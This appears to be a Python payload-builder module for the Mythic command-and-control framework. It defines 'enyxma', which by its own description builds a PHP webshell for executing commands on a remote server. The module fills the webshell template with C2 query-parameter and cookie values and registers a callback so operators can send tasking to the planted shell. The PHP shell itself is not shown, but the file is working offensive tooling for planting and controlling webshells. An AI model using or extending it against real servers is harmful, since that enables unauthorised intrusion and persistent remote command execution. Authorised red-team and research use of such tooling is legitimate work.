import logging
import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json

class Enyxma(PayloadType):
    # Metadata for the payload
    name = "enyxma"
    file_extension = "php"  # The payload file will have a .php extension
    author = "@Termindiego25"
    supported_os = [SupportedOS.Windows, SupportedOS.Linux]
    wrapper = False
    wrapped_payloads = []
    note = """This agent creates a webshell capable of executing commands on a remote server."""
    supports_dynamic_loading = False
    c2_profiles = ["enyxma_c2p"]  # Only one C2 profile is allowed, which must be configured as "enyxma_c2p"
    mythic_encrypts = True
    translation_container = None
    build_parameters = []  # Additional build parameters can be added here if needed
    agent_path = pathlib.Path(".") / "enyxma"
    agent_icon_path = agent_path / "agent_functions" / "enyxma.svg"
    agent_code_path = agent_path / "agent_code"

    async def build(self) -> BuildResponse:
        """
        This function is called to create an instance of the payload.
        It reads the payload code from disk, replaces placeholders with configuration values,
        and creates a callback for the payload.
        """
        resp = BuildResponse(status=BuildStatus.Error)
        try:
            # Read the base payload file (assuming PHP environment)
            payloadFile = open(f"{self.agent_code_path}/enyxma.php", 'r').read()
            # Ensure the filename has the correct extension
            if not self.filename.endswith(".php"):
                resp.updated_filename = self.filename + ".php"

            # Validate that exactly one C2 profile is included
            if len(self.c2info) == 0:
                resp.build_message = "Must include the `enyxma_c2p` C2 profile with communication parameters."
                return resp
            if len(self.c2info) > 1:
                resp.build_message = "Can't include more than one C2 profile currently."
                return resp

            remote_url = ""
            for c2 in self.c2info:
                try:
                    profile = c2.get_c2profile()
                    # Ensure the correct C2 profile is used
                    if profile["name"] != "enyxma_c2p":
                        resp.build_message = "Must include the `enyxma_c2p` C2 profile"
                        return resp
                    c2_dict = c2.get_parameters_dict()
                    # Replace placeholders in the payload code with actual values
                    payloadFile = payloadFile.replace('%PARAM%', c2_dict["query_param"])
                    payloadFile = payloadFile.replace('%COOKIE_NAME%', c2_dict["cookie_name"])
                    payloadFile = payloadFile.replace('%COOKIE_VALUE%', self.uuid)
                    #file1 = file1.replace('%USER_AGENT%', c2_dict['user_agent'])
                    remote_url = c2_dict["url"]
                except Exception as e:
                    resp.build_stderr = str(e)
                    return resp

            # Set the final payload code
            resp.payload = payloadFile
            resp.status = BuildStatus.Success

            # Create a callback for the C2 profile so that the payload can start communication
            create_callback = await SendMythicRPCCallbackCreate(MythicRPCCallbackCreateMessage(
                PayloadUUID=self.uuid,
                C2ProfileName="enyxma_c2p",
            ))

            # Build a message explaining the callback and connection details
            resp.build_message = f"An initial callback is automatically created. Tasking this callback will try to reach out directly to {remote_url} to issue tasking."
            resp.build_message += f"\nLink to this callback from another agent in order to task {remote_url} from that agent."
            resp.build_message += f"\nUnlink all other callbacks from this callback in order to have the payload type container reach out directly to {remote_url} again."

            if not create_callback.Success:
                logger.info(create_callback.Error)
            else:
                logger.info(create_callback.CallbackUUID)

        except Exception as e:
            resp.message = "Error building payload: " + str(e)
            resp.build_stderr = str(e)

        return resp

    async def on_new_callback(self, newCallback: PTOnNewCallbackAllData) -> PTOnNewCallbackResponse:
        """
        This function is called whenever a new callback is created.
        It logs the new callback and returns a success response.
        """
        logger.info("new callback")
        return PTOnNewCallbackResponse(AgentCallbackID=newCallback.Callback.AgentCallbackID, Success=True)